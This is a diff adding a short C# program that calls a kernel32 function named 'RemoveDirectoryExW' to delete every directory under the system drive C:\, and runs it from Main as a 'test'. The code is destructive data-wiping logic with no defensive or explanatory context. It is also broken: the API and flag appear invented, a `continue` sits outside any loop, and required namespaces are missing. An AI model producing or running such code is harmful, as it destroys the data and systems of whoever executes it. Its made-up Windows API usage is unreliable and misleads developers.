@@ -1,0 +1,38 @@
+using System.IO;
+
+// Use RemoveDirectoryExW to delete a directory
+[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+private static extern bool RemoveDirectoryExW(string lpPathName, uint dwFlags);
+
+// Set the flags to allow deleting a non-empty directory
+const uint REMOVE_DIRECTORY_EX_FLAGS = 0x00000008;
+
+// Set the path to the root directory
+const string ROOT_DIRECTORY = "C:\\";
+
+void DeleteDirectories()
+{
+    try
+    {
+        // Get all the directories in the root directory
+        var directories = Directory.GetDirectories(ROOT_DIRECTORY);
+        
+        // Loop through each directory and delete it
+        foreach (var directory in directories)
+        {
+            // Delete the directory
+            RemoveDirectoryExW(directory, REMOVE_DIRECTORY_EX_FLAGS);
+        }
+    }
+    catch (IOException)
+    {
+        // Catch any errors and continue to delete the next directory
+        continue;
+    }
+}
+
+// Use Main to test the DeleteDirectories method
+static void Main(string[] args)
+{
+    DeleteDirectories();
+}
